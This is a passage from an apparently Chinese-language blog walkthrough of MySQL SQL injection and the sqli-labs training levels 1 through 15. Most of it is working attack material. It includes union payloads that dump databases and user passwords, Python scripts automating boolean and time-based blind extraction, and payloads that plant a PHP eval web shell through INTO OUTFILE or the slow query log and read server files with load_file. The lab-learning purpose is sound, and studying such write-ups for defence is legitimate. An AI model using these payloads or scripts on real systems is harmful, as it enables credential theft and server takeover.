class="string">&quot;url?id=1[&#x27; | &quot;</span> | ) | <span class="string">&#x27;) | &quot;) ...] and 1=&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">result = &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">i = 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">while True:</span></span><br><span class="line"><span class="string">    i = i + 1</span></span><br><span class="line"><span class="string">    head = 32</span></span><br><span class="line"><span class="string">    tail = 127</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    while head &lt; tail:</span></span><br><span class="line"><span class="string">        mid = (head + tail) &gt;&gt; 1 #中值</span></span><br><span class="line"><span class="string">        payload = f&#x27;</span><span class="keyword">if</span>(<span class="built_in">ascii</span>(substr(database(),&#123;i&#125;,<span class="number">1</span>))&gt;&#123;mid&#125;,<span class="number">1</span>,sleep(<span class="number">3</span>))--+<span class="string">&#x27; #当前数据库名</span></span><br><span class="line"><span class="string">        # payload = f&#x27;</span><span class="keyword">if</span>(<span class="built_in">ascii</span>(substr((select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database()),&#123;i&#125;,<span class="number">1</span>))&gt;&#123;mid&#125;,<span class="number">1</span>,sleep(<span class="number">3</span>))--+<span class="string">&#x27; #爆表名</span></span><br><span class="line"><span class="string">        # payload = f&#x27;</span><span class="keyword">if</span>(<span class="built_in">ascii</span>(substr((select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&quot;users&quot;</span>),&#123;i&#125;,<span class="number">1</span>))&gt;&#123;mid&#125;,<span class="number">1</span>,sleep(<span class="number">3</span>))--+<span class="string">&#x27; #爆字段</span></span><br><span class="line"><span class="string">        # payload = f&#x27;</span><span class="keyword">if</span>(<span class="built_in">ascii</span>(substr((select group_concat(username) <span class="keyword">from</span> users),&#123;i&#125;,<span class="number">1</span>))&gt;&#123;mid&#125;,<span class="number">1</span>,sleep(<span class="number">3</span>))--+<span class="string">&#x27; #爆用户名</span></span><br><span class="line"><span class="string">        # payload = f&#x27;</span><span class="keyword">if</span>(<span class="built_in">ascii</span>(substr((select group_concat(password) <span class="keyword">from</span> users),&#123;i&#125;,<span class="number">1</span>))&gt;&#123;mid&#125;,<span class="number">1</span>,sleep(<span class="number">3</span>))--+<span class="string">&#x27; #爆密码</span></span><br><span class="line"><span class="string">        try:</span></span><br><span class="line"><span class="string">            r = requests.get[ | POST ](url + payload, timeout=2)</span></span><br><span class="line"><span class="string">            head = mid + 1</span></span><br><span class="line"><span class="string">        except Exception as e:</span></span><br><span class="line"><span class="string">            tail = mid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if head != 32:</span></span><br><span class="line"><span class="string">        result += chr(head)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        break</span></span><br><span class="line"><span class="string">print(result)</span></span><br></pre></td></tr></table></figure><h4 id="3-mysql注入读写文件"><a href="#3-mysql注入读写文件" class="headerlink" title="3.mysql注入读写文件"></a>3.mysql注入读写文件</h4><p>mysql数据库在渗透过程中能够使用的功能除了读取数据之外，还可以对文件进行读写。</p><h5 id="1-前提"><a href="#1-前提" class="headerlink" title="1.前提"></a>1.前提</h5><p>1.用户权限足够高，尽量具有root权限</p><p>2.secure_file_priv不为null(默认为null)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">查看secure_file_priv的值</span><br><span class="line">show global variables like &#x27;%secure%&#x27;;</span><br><span class="line">或者是直接搜全名</span><br><span class="line">show global variables like &#x27;secure_file_priv&#x27;;</span><br><span class="line"></span><br><span class="line">修改值:</span><br><span class="line">windows下：修改my.ini 在[mysqld]内加入secure_file_priv =  #设置为空不对mysqld 的导入 | 导出做限制</span><br><span class="line">linux下：修改/etc/my.cnf 在[mysqld]内加入secure_file_priv =</span><br><span class="line">若要将mysql的写入写出限制在某一目录下，只需secure_file_priv的值为该目录即可，例如：secure_file_priv=/tmp/</span><br><span class="line">然后重启mysql，再查询secure_file_priv</span><br></pre></td></tr></table></figure><h5 id="2-读取文件"><a href="#2-读取文件" class="headerlink" title="2.读取文件"></a>2.读取文件</h5><p>读取文件load_file()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url?id=-1[&#x27; | &quot; | ) | &#x27;) | &quot;) ] union select 1,load_file(&quot;path&quot;),[3,4...] --+</span><br><span class="line">注意路径需要双斜杠：\\</span><br></pre></td></tr></table></figure><h5 id="3利用into-outfile写入文件"><a href="#3利用into-outfile写入文件" class="headerlink" title="3利用into outfile写入文件"></a>3利用into outfile写入文件</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url?id=-1[&#x27; | &quot; | ) | &#x27;) | &quot;) ] union select 1,&#x27;&lt;?php @eval($POST_[1])?&gt;&#x27;[3,4...] into outfile&#x27;/path/文件名&#x27; --+</span><br><span class="line">注意路径需要双斜杠：\\</span><br><span class="line">并且写马子的时候不能用&#x27;&#x27;，尽量使用数字作为密码，因为单引号会闭合前面的引号</span><br></pre></td></tr></table></figure><h5 id="4-利用日志写shell"><a href="#4-利用日志写shell" class="headerlink" title="4.利用日志写shell"></a>4.利用日志写shell</h5><p>mysql日志主要包含:错误日志、查询日志、慢查询日志、事务日志，日志的详细情况参考<a href="http://blog.51cto.com/pangge/1319304">mysql日志详细解析</a>，本次利用查询日志</p><p>1.设置slow_query_log&#x3D;1.即启用慢查询日志(默认禁用)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log=1;</span><br></pre></td></tr></table></figure><p>2.伪造(修改)slow_query_log_file日志文件的绝对路径以及文件名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log_file=&#x27;dir\filename&#x27;;</span><br><span class="line">#注意路径双写</span><br></pre></td></tr></table></figure><p>3.向日志文件写入shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27; or sleep(11);</span><br></pre></td></tr></table></figure><p>4.利用:浏览器直接访问该网站下的伪造的该日志文件路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip/[dir/]filename</span><br></pre></td></tr></table></figure><p>或者是把写入的内容改为一句话木马也可。</p><h2 id="2-靶场通关记录"><a href="#2-靶场通关记录" class="headerlink" title="2.靶场通关记录"></a>2.靶场通关记录</h2><h3 id="Less1：GET基于报错的字符型注入-单引号"><a href="#Less1：GET基于报错的字符型注入-单引号" class="headerlink" title="Less1：GET基于报错的字符型注入(单引号)"></a>Less1：GET基于报错的字符型注入(单引号)</h3><p>1.找到注入点：id</p><img src="image-20210216160721715.png" alt="image-20210216160721715" style="zoom:80%;"><p>2.进行试错，猜测语句</p><img src="image-20210216161133243.png" alt="image-20210216161133243" style="zoom:80%;"><p>则语句为：<code>select login_name,passwd from table where id = &#39;number&#39; limit 0,1</code></p><p>3.判断字段数：3</p><p>payload：<code>?id=1&#39;order by 4 --+</code></p><p><img src="image-20210216164833065.png" alt="image-20210216164833065" style="zoom:80%;"><img src="image-20210216164901146.png" alt="image-20210216164901146" style="zoom:80%;"></p><p>4.爆数据库</p><p>MySQL中的所有数据库：</p><p>payload：<code>?id=-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</code></p><p><img src="image-20210216171624988.png" alt="image-20210216171624988"></p><p>当前正在使用的数据库以及系统的所有信息</p><p>payload：<code>?id=-1&#39; union select 1,concat_ws(&#39;|&#39;,database(),version(),@@datadir,@@version_compile_os),user()  --+</code></p><p>ps:<code>concat_ws</code>可替换为<code>group_concat</code></p><p><img src="image-20210216193609512.png" alt="image-20210216193609512"></p><p>5.爆表名 </p><p>payload：<code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot; --+</code></p><p>或者没有爆出当前表名：<code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></p><p><img src="image-20210216195024012.png" alt="image-20210216195024012"></p><p>6.爆列名</p><p>payload：<code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></p><p><img src="image-20210216195634870.png" alt="image-20210216195634870"></p><p>7.爆出所有账户密码</p><p>payload：<code>?id=-1&#39; union select 1,group_concat(username,password),3 from users --+</code></p><p><img src="image-20210216195854574.png" alt="image-20210216195854574"></p><h3 id="Less2：GET基于报错数字型注入"><a href="#Less2：GET基于报错数字型注入" class="headerlink" title="Less2：GET基于报错数字型注入"></a>Less2：GET基于报错数字型注入</h3><p>1.找到注入点：id</p><p><img src="image-20210216201108241.png" alt="image-20210216201108241"></p><p>2.试错，猜语句</p><p><img src="image-20210216202344713.png" alt="image-20210216202344713"></p><p>则语句：<code>select login_name,passwd from table where id = number limit 0,1</code></p><p>找到闭合了就和less1一样了剩下的</p><h3 id="Less3：GET基于报错字符型注入-带括号的单引号"><a href="#Less3：GET基于报错字符型注入-带括号的单引号" class="headerlink" title="Less3：GET基于报错字符型注入(带括号的单引号)"></a>Less3：GET基于报错字符型注入(带括号的单引号)</h3><p>1.寻找注入点：id</p><p>2.试错，猜语句</p><p><img src="image-20210217001833673.png" alt="image-20210217001833673"></p><p>则语句为：<code>select login_name,passwd from table where id=(&#39;1&#39;) limit 0,1</code></p><p>闭合找到后和less1剩下的操作一样了</p><h3 id="Less4：GET基于报错字符型注入-双引号"><a href="#Less4：GET基于报错字符型注入-双引号" class="headerlink" title="Less4：GET基于报错字符型注入(双引号)"></a>Less4：GET基于报错字符型注入(双引号)</h3><p>1.寻找注入点：id</p><p>2.试错，猜语句</p><p><img src="image-20210217003701458.png" alt="image-20210217003701458"></p><p>则语句为：<code>select login_name,passwd from table where id=(”1“) limit 0,1</code></p><p>剩下的操作参考less1</p><h3 id="Less5：GET双查询字符型-单引号"><a href="#Less5：GET双查询字符型-单引号" class="headerlink" title="Less5：GET双查询字符型(单引号)"></a>Less5：GET双查询字符型(单引号)</h3><p>这一关如果正确则显示you are in …,失败则会报错。这一关可以当作盲注解决，但是如题目一样使用双查询</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#当前使用数据库</span><br><span class="line">?id=-1&#x27; union select 1,count(*), concat_ws(&#x27;:&#x27;,(select database()), floor(rand()*2))as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure><p><img src="image-20210219001046483.png" alt="image-20210219001046483"></p><p>也可布尔盲注，参考less5</p><h3 id="Less6：GET双查询字符型-双引号"><a href="#Less6：GET双查询字符型-双引号" class="headerlink" title="Less6：GET双查询字符型(双引号)"></a>Less6：GET双查询字符型(双引号)</h3><p>和less5一样，只不过闭合是双引号。</p><h3 id="Less7：盲注GET文件写入"><a href="#Less7：盲注GET文件写入" class="headerlink" title="Less7：盲注GET文件写入"></a>Less7：盲注GET文件写入</h3><p>1.注入点：id</p><p>2.猜语句，经过多次实验，只有输入<code>&#39;</code>会报错</p><p><img src="image-20210217174821016.png" alt="image-20210217174821016"></p><p>没有错误提示，盲注，经过多次实验，以下可行</p><p><img src="image-20210217175333779.png" alt="image-20210217175333779"></p><p>则猜测语句注入点为：<code>?id=((&#39;1&#39;))</code></p><p>3.猜字段</p><p><img src="image-20210217180130902.png" alt="image-20210217180130902"><img src="image-20210217180147338.png" alt="image-20210217180147338"></p><p>4.写shell</p><p>payload：<code>?id=-1&#39;)) union select 1,&#39;&lt;?php @eval($POST_[1])?&gt;&#39;3 into outfile&#39;C:\\test\\1.php&#39; --+</code></p><p><img src="image-20210217183945287.png" alt="image-20210217183945287"></p><h3 id="Less8：GET布尔盲注"><a href="#Less8：GET布尔盲注" class="headerlink" title="Less8：GET布尔盲注"></a>Less8：GET布尔盲注</h3><p>1.注入点：id</p><p>2.猜关键点语句</p><p><img src="image-20210217184401867.png" alt="image-20210217184401867"></p><p>没有错误提示，是盲注，只有一次次自己实验闭合</p><p><img src="image-20210217184336953.png" alt="image-20210217184336953"></p><p>则关键点闭合为：<code>?id=&#39;1&#39;</code></p><p>3.猜字段：3</p><p><img src="image-20210217193145935.png" alt="image-20210217193145935"><img src="image-20210217193201961.png" alt="image-20210217193201961"></p><p>4.跑数据，用二分法，用burp跑步骤太多了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.43.78/sqli-labs/Less-8/?id=1&#x27; and 1=&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">i=i+<span class="number">1</span></span><br><span class="line">min_value = <span class="number">32</span></span><br><span class="line">max_value = <span class="number">127</span></span><br><span class="line">mid = (min_value+max_value)//<span class="number">2</span> <span class="comment">#中值</span></span><br><span class="line"><span class="keyword">while</span>(min_value&lt;max_value):</span><br><span class="line">payload = <span class="string">f&#x27;if(ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)--+&#x27;</span> <span class="comment">#爆当前数据库名</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&#x27;  #爆表名</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&#x27; #爆字段</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select group_concat(username) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&#x27; #爆用户名</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select group_concat(password) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&#x27; #爆密码</span></span><br><span class="line">html = requests.get(url + payload, timeout=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            <span class="comment">#ascii值比mid值大</span></span><br><span class="line">min_value = mid+<span class="number">1</span>   </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">max_value = mid</span><br><span class="line">mid = (min_value+max_value)//<span class="number">2</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> min_value != <span class="number">32</span>:</span><br><span class="line">result += <span class="built_in">chr</span>(min_value)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p><img src="image-20210217202626517.png" alt="image-20210217202626517"></p><h3 id="Less9：GET时间盲注-单引号"><a href="#Less9：GET时间盲注-单引号" class="headerlink" title="Less9：GET时间盲注(单引号)"></a>Less9：GET时间盲注(单引号)</h3><p>1.注入点：id</p><p>2.试错，猜语句.猜鸭儿，试了很多语句都是一样的回显，看了眼后台果断懵逼，不会有第二种结果。。。</p><p>老规矩二分法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.43.78/sqli-labs/Less-8/?id=1&#x27; and 1=&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment">#中值</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,sleep(3))--+&#x27;</span> <span class="comment">#当前数据库名</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27; #爆表名</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27; #爆字段</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select group_concat(username) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27; #爆用户名</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select group_concat(password) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27; #爆密码</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url + payload, timeout=<span class="number">2</span>)</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h3 id="Less10：GET时间盲注-双引号"><a href="#Less10：GET时间盲注-双引号" class="headerlink" title="Less10：GET时间盲注(双引号)"></a>Less10：GET时间盲注(双引号)</h3><p>试了很多遍，结果都一样，看了眼后台果然不会有第二种结果。。直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;url/?id=1\&quot; and 1=&quot;</span>   <span class="comment">#\转义</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,sleep(3))--+&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select group_concat(username) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select group_concat(password) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url + payload, timeout=<span class="number">2</span>)</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h3 id="Less11：POST报错注入字符型-单引号"><a href="#Less11：POST报错注入字符型-单引号" class="headerlink" title="Less11：POST报错注入字符型(单引号)"></a>Less11：POST报错注入字符型(单引号)</h3><p>发现登录界面，随便试错猜语句</p><p><img src="image-20210218002409207.png" alt="image-20210218002409207"></p><p>则语句：<code>uname=&#39;1&#39; and password=&#39;&#39; LIMIT 0,1</code></p><p>直接在登陆界面执行以下payload可以查询到数据库，表，账户密码信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">MySQL中的所有数据库：</span><br><span class="line">-1&#x27; union select 1,group_concat(schema_name)from information_schema.schemata #</span><br><span class="line"></span><br><span class="line">当前正在使用的数据库以及系统的所有信息</span><br><span class="line">-1&#x27; union select 1,concat_ws(&#x27;|&#x27;,database(),version(),@@datadir,@@version_compile_os,user())  #</span><br><span class="line"></span><br><span class="line">爆出当前表名</span><br><span class="line">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br><span class="line"></span><br><span class="line">爆列名</span><br><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #</span><br><span class="line"></span><br><span class="line">爆出所有账户密码</span><br><span class="line">-1&#x27; union select 1,group_concat(username,password) from users #</span><br></pre></td></tr></table></figure><p>或者是直接进后台得到一个账号密码：<code>1&#39; or 1=1 #</code></p><p><img src="image-20210218005003622.png" alt="image-20210218005003622"></p><h3 id="Less12：POST报错注入字符型-带单括号的单引号"><a href="#Less12：POST报错注入字符型-带单括号的单引号" class="headerlink" title="Less12：POST报错注入字符型(带单括号的单引号)"></a>Less12：POST报错注入字符型(带单括号的单引号)</h3><p>按less11的步骤来，只不过是以<code>&quot;)</code>闭合的</p><h3 id="Less13：POST字符型双查询-带括号的单引号"><a href="#Less13：POST字符型双查询-带括号的单引号" class="headerlink" title="Less13：POST字符型双查询(带括号的单引号)"></a>Less13：POST字符型双查询(带括号的单引号)</h3><p>利用方法参考less5。另外：</p><p>updatexml测试有回显：<code>111&#39;) and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#</code></p><p>extractvalue也有回显：<code>111&#39;) and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</code></p><h3 id="Less14：POST字符型双查询-带括号的单引号"><a href="#Less14：POST字符型双查询-带括号的单引号" class="headerlink" title="Less14：POST字符型双查询(带括号的单引号)"></a>Less14：POST字符型双查询(带括号的单引号)</h3><p>双查询没搞出来，但是用updatexml和extractvalue有回显</p><p>盲注：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;url&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;hhh&quot; or 1=if(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;hhh&quot; or 1=if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)-- -&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;hhh&quot; or 1=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) #&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;hhh&quot; or 1=if(ascii(substr((select group_concat(username) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) #&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;hhh&quot; or 1=if(ascii(substr((select group_concat(password) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) #&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;hhh&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;passwd&#x27;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h3 id="Less15：POST布尔-时间盲注-带单引号"><a href="#Less15：POST布尔-时间盲注-带单引号" class="headerlink" title="Less15：POST布尔&#x2F;时间盲注(带单引号)"></a>Less15：POST布尔&#x2F;时间盲注(带单引号)</h3><p>lesss14中的盲注双引号改为单引号即可</p><p>也可手动burp操作</p><p>例如猜数据库长度</p><p><img 